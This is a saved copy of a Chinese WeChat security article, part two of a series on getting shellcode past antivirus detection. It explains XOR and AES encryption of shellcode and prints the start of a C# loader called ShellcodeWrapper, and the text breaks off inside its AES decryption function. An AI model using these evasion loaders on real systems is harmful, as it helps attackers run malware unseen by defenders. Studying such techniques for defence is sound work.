<html>
<head>
<title>干货Shellcode免杀总结二</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
干货 | Shellcode免杀总结&lt;二&gt;
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                <span id="copyright_logo" class="rich_media_meta icon_appmsg_tag appmsg_title_tag weui-wa-hotarea">原创</span>
                                                                                            <span class="rich_media_meta rich_media_meta_text">
                                                                    卿
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2020-02-08</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><h2 style="white-space: normal;text-align: center;" data-mpa-powered-by="yiban.io"><strong>Shellcode免杀总结-第二篇</strong></a></h2><h1 style="margin: 2em auto 1em;padding-right: 1em;padding-left: 1em;font-weight: bold;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 15.96px;display: table;border-bottom: 2px solid rgb(0, 152, 116);">0x02 那些shellcode"混淆"免杀</h1><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">shellcode是否可以像php一句话那样混淆、加密、拆分呢</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">还是从最简单的举例子开始</p><h2 style="margin: 4em auto 2em;padding-right: 0.2em;padding-left: 0.2em;font-weight: bold;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 15.4px;display: table;background: rgb(0, 152, 116);">A）shellcode编码混淆</h2><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">xor异或加密shellcode后，申请内存执行，和文开头执行shell从的方式无区别</p><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">这里拿C# xor为例子（ShellcodeWrapper）:</h4><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">using</span> <span style="color: rgb(0, 134, 179);">System</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">using</span> <span style="color: rgb(0, 134, 179);">System</span>.IO;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">using</span> <span style="color: rgb(0, 134, 179);">System</span>.<span style="color: rgb(0, 134, 179);">Collections</span>.<span style="color: rgb(0, 134, 179);">Generic</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">using</span> <span style="color: rgb(0, 134, 179);">System</span>.<span style="color: rgb(0, 134, 179);">Text</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">using</span> <span style="color: rgb(0, 134, 179);">System</span>.<span style="color: rgb(0, 134, 179);">Threading</span>.<span style="color: rgb(0, 134, 179);">Tasks</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">using</span> <span style="color: rgb(0, 134, 179);">System</span>.<span style="color: rgb(0, 134, 179);">Security</span>.<span style="color: rgb(0, 134, 179);">Cryptography</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">using</span> <span style="color: rgb(0, 134, 179);">System</span>.<span style="color: rgb(0, 134, 179);">Runtime</span>.<span style="color: rgb(0, 134, 179);">InteropServices</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">namespace</span> <span style="color: rgb(0, 134, 179);">RunShellCode</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">{</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(167, 29, 93);">class</span> <span style="color: rgb(0, 134, 179);">Program</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(150, 152, 150);">//==============================================================================</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(150, 152, 150);">// CRYPTO FUNCTIONS</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(150, 152, 150);">//==============================================================================</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> T[] <span style="color: rgb(0, 134, 179);">SubArray</span>&lt;T&gt;(<span style="color: rgb(167, 29, 93);">this</span> T[] data, <span style="color: rgb(167, 29, 93);">int</span> index, <span style="color: rgb(167, 29, 93);">int</span> length)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            T[] result = <span style="color: rgb(167, 29, 93);">new</span> T[length];</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">Array</span>.<span style="color: rgb(0, 134, 179);">Copy</span>(data, index, result, <span style="color: rgb(0, 134, 179);">0</span>, length);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">return</span> result;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(167, 29, 93);">byte</span>[] xor(<span style="color: rgb(167, 29, 93);">byte</span>[] cipher, <span style="color: rgb(167, 29, 93);">byte</span>[] key) {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">byte</span>[] decrypted = <span style="color: rgb(167, 29, 93);">new</span> <span style="color: rgb(167, 29, 93);">byte</span>[cipher.<span style="color: rgb(0, 134, 179);">Length</span>];</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">for</span>(<span style="color: rgb(167, 29, 93);">int</span> i = <span style="color: rgb(0, 134, 179);">0</span>; i &lt; cipher.<span style="color: rgb(0, 134, 179);">Length</span>; i++) {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                decrypted[i] = (<span style="color: rgb(167, 29, 93);">byte</span>) (cipher[i] ^ key[i % key.<span style="color: rgb(0, 134, 179);">Length</span>]);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">return</span> decrypted;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(150, 152, 150);">//--------------------------------------------------------------------------------------------------</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(150, 152, 150);">// Decrypts the given a plaintext message byte array with a given 128 bits key</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(150, 152, 150);">// Returns the unencrypted message</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(150, 152, 150);">//--------------------------------------------------------------------------------------------------</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(167, 29, 93);">byte</span>[] aesDecrypt(<span style="color: rgb(167, 29, 93);">byte</span>[] cipher, <span style="color: rgb(167, 29, 93);">byte</span>[] key)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">var</span> IV = cipher.<span style="color: rgb(0, 134, 179);">SubArray</span>(<span style="color: rgb(0, 134, 179);">0</span>, <span style="color: rgb(0, 134, 179);">16</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">var</span> encryptedMessage = cipher.<span style="color: rgb(0, 134, 179);">SubArray</span>(<span style="color: rgb(0, 134, 179);">16</span>, cipher.<span style="color: rgb(0, 134, 179);">Length</span> - <span style="color: rgb(0, 134, 179);">16</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(150, 152, 150);">// Create an AesManaged object with the specified key and IV.</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">using</span> (<span style="color: rgb(0, 134, 179);">AesManaged</span> aes = <span style="color: rgb(167, 29, 93);">new</span> <span style="color: rgb(0, 134, 179);">AesManaged</span>())</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                aes.<span style="color: rgb(0, 134, 179);">Padding</span> = <span style="color: rgb(0, 134, 179);">PaddingMode</span>.PKCS7;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                aes.<span style="color: rgb(0, 134, 179);">KeySize</span> = <span style="color: rgb(0, 134, 179);">128</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                aes.<span style="color: rgb(0, 134, 179);">Key</span> = key;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                aes.IV = IV;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                <span style="color: rgb(167, 29, 93);">using</span> (<span style="color: rgb(0, 134, 179);">MemoryStream</span> ms = <span style="color: rgb(167, 29, 93);">new</span> <span style="color: rgb(0, 134, 179);">MemoryStream</span>())</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(167, 29, 93);">using</span> (<span style="color: rgb(0, 134, 179);">CryptoStream</span> cs = <span style="color: rgb(167, 29, 93);">new</span> <span style="color: rgb(0, 134, 